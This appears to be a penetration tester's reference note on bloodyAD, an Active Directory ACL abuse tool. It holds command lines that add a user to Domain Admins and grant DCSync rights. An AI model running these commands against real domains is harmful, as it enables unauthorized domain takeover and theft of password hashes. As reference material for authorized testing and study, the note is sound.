---
tags: [tool, activedirectory, acl]
tool: "bloodyad"
category: "Active Directory"
installed: true
phase: [exploitation]
---

# bloodyAD - ACL Abuse Toolkit

## Tool Overview
Purpose: Active Directory ACL abuse tool
Location: /usr/bin/bloodyad

## How to Use It

Get Object Info:
bloodyAD --host dc.domain.local -d domain.local -u user -p pass get object Users

Add User to Group:
bloodyAD --host dc.domain.local -d domain.local -u user -p pass add groupMember "Domain Admins" newuser

DCSync Rights:
bloodyAD --host dc.domain.local -d domain.local -u user -p pass add dcsync user

## Related Tools
aclpwn, dacledit
